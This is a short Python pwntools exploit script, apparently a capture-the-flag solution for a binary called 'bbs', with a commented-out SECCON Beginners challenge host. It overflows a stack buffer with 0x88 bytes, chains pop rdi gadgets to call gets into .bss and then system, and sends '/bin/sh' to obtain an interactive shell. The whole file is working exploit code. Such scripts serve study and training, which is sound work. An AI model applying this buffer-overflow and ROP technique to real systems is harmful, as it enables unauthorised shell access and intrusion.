# -*- coding: utf-8 -*-

import socket, struct, telnetlib
from pwn import *


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


# s, f = sock("127.0.0.1", 4088)
#s, f = sock("pwn1.chall.beginners.seccon.jp", 18373)

io = process('./bbs')

buf = ''
buf += 'A' * 0x88
buf += p64(0x400763) # pop rdi; ret; addr
buf += p64(0x601000) # buffer_addr (bss)
buf += p64(0x400570) # gets addr
buf += p64(0x400763) # pop rdi; ret; addr
buf += p64(0x601000) # buffer_addr
buf += p64(0x400540) # system addr

io.sendline(buf)

buf = '/bin/sh'
io.sendline(buf)
io.interactive()
